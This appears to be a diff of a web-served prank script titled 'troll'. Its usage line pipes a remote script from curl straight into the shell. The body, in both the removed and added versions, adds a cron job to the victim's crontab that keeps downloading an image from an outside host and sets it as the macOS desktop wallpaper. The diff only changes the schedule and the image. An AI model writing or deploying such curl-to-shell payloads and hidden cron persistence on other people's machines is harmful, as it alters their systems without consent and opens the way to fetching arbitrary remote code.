@@ -3,4 +3,4 @@ layout: none
 usage: source <(curl -s https://gregology.net/troll)
 ---
 
-crontab -l | { cat; echo "* * * * * curl -o /tmp/bg.jpg https://gregology.net/img/areez.jpg && osascript -e 'tell application \"Finder\" to set desktop picture to POSIX file \"/tmp/bg.jpg\"'"; } | crontab -
+crontab -l | { cat; echo "13 11 * * 2 rm -f /tmp/bg.jpg && curl -o /tmp/bg.jpg https://gregology.net/img/bg.jpg && osascript -e 'tell application \"Finder\" to set desktop picture to POSIX file \"/tmp/bg.jpg\"'"; } | crontab -
